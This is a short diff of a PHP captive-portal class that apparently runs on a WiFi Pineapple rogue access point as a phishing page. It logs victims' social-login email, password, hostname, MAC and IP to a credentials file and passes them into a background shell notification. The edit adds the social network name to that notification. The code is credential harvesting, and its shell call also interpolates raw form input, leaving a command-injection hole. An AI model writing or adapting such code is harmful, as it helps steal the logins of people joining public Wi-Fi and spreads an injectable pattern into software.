@@ -47,7 +47,7 @@ class MyPortal extends Portal
             $mac = isset($_POST['mac']) ? $_POST['mac'] : 'mac';
             $ip = isset($_POST['ip']) ? $_POST['ip'] : 'ip';
             file_put_contents("/pineapple/logs/cackeatres.txt", "[" . date('Y-m-d H:i:s') . "Z]\n" . "{$social}\nemail: {$email}\npassword: {$pwd}\nhostname: {$hostname}\nmac: {$mac}\nip: {$ip}\n\n", FILE_APPEND);
-            $this->execBackground("notify $email' - '$pwd");
+            $this->execBackground("notify $social' - '$email' - '$pwd");
         }
         // handle form input or other extra things there
 
